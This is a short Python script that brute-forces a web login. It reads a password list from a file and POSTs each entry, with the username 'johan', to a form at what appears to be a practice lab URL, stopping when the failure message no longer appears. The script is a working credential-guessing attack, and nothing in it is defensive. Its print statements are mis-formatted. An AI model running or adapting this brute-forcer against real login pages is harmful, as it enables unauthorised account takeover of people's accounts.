import requests
class bruteforce:
    def hackpassword(self, password):
        url = "https://nikkoenggaliano.my.id/labs/web/hack0.php"
        for x in password:
            data = {
                "userkak": "johan",
                "p": x,
                "submit": "Log+on!"
            }
            do = requests.post(url, data).text
            if "Was Wrong boys!" in do:
                print("{} salah", format(x))
            else:
                print("Benar{}", format(x))
                exit(0)
hack = bruteforce()
sandi = open('password.txt').read().split("\n")
hack.hackpassword(sandi)
